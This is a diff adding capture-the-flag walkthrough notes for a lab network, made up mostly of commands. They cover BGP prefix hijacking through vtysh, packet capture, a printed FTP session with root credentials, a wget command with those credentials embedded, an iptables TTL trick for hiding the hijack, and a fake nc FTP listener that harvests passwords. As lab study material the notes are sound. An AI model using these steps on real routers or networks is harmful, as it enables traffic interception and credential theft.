@@ -95,4 +95,119 @@ can figure out in which network we are.
 ### show running-config
 ### show ip route 10.120.15.10
 found out that we have to go through 10.78.11.2 in order to get to FTP server
-###
+### sh ip bgp summary
+lookup asn number                 using ipinfo.io asn lookup
+### sh ip bgp                     shows all routes
+### sh ip bgp 10.120.150.0/24     show info on advertisements
+### sh ip bgp neighbors 10.78.10.2 advertised-routes
+
+beginning hijacking
+### mv /opt/restore.sh /opt/restore2.sh
+### vtysh
+### configure terminal            enter a config mode
+### do sh run 
+### router bgp 100                enter a config-router mode
+### network 10.120.15.0/25        advertise more specific route for 10.120.15.10
+### exit
+### exit
+### clear ip bgp * out
+### sh ip bgp 10.120.15.0/25
+### sh ip bgp neighbors 10.78.10.2 advertised-routes     shows that we are a prefered route to 10.120.15.0/25.
+### cd ~
+### tcpdump -i any -w ftp-1.cap port 21
+### Ctrl^Z
+### base64 ftp-1.cap              copy it and analyse it using wireshark on your computer
+### vim ftp-1.cap.b64             paster encoded data
+### base64 -d ftp-1.cap.b64 > ftp-1.cap
+### wireshark
+Got packets. 10.78.10.* sends SYN packets through us, but the handshake is never completed
+in terminal:
+### vtysh
+### sh ip bgp neighbors 10.78.11.2 advertised-routes   10.78.10.2 sends packets to us, then we send them to 10.78.11.2 and they send a packet not to a destination, but to us back.
+### exit
+### nohup tcpdump -i any -w icmp.cap &
+### ping -c 1 10.120.15.10                    it'll timeout
+### pkill tcpump
+### ps -ef | grep tcpdump
+### kill process_id
+### base64 icmp.cap                           it's very big
+### nohup tcpdump -i any -w icmp.cap not port 22
+### ping -c 1 10.120.15.10
+### ps -ef | grep tcpdump
+### kill process_id
+### base64 icmp.cap
+save it on my PC and run
+### wireshark
+we have to destroy a route from us to 10.78.11.2
+### vtysh
+### conf t
+### do sh run
+block for as300
+### ip prefix-list PrefixList permit 10.120.15.0/25
+### route-map to-as300 deny 5
+### match ip address prefix-list PrefixList
+### exit
+### end
+### clear ip bgp * out
+### ping 10.120.15.10
+GET TRAFIC DUMP again
+analyse it with
+### wireshark
+### vtysh
+### conf t
+### route-map to-as200 permit 5
+### match ip address prefix-list PrefixList
+### set community no-export
+### end
+### ping 10.120.15.10                              works
+GET TRAFIC DUMP again
+### nohup tcpdump -i any -w ftp2.cap port 21
+analyse it with
+### base64 ftp2.cap
+### wireshark
+follow a tcp stream
+find credentials
+
+TCP STREAM
+#################################################################
+220 (vsFTPd 3.0.3)
+USER root                                                        user
+331 Please specify the password.
+PASS BGPtelc0rout1ng                                             pass
+230 Login successful.
+SYST
+215 UNIX Type: L8
+TYPE I
+200 Switching to Binary mode.
+PASV
+227 Entering Passive Mode (10,120,15,10,154,29).
+STOR secretdata.txt
+150 Ok to send data.
+226 Transfer complete.
+QUIT
+221 Goodbye.
+##################################################################
+
+1 varient:
+	using ftp pass mode (pass command)
+2 varient:
+	wget -m ftp://root:BGPtelc0rout1ng@10.120.15.10
+
+got root.txt and secretdata.txt
+
+for fun:
+
+ssh to 10.10.10.105
+### lxc list
+launch 3 terminals
+
+### lxc exec -- INTERFACE_NAME bash
+### iptables -t mangle -A PREROUTING -i eth1 -j TTL --ttl-inc 1
+this makes your invisible if u do this on all interfaces.
+P.S. there might be other techniques to detect bgp hijacking	
+
+The second way to get user and pass. route all trafic to our router. Then type these commands
+### ifconfig eth2 10.120.15.10 netmask 255.255.255.128
+### nc -lvnp 21
+after receiving a connection and receiving USER root
+reply 331 in next line, then u'll get a password.
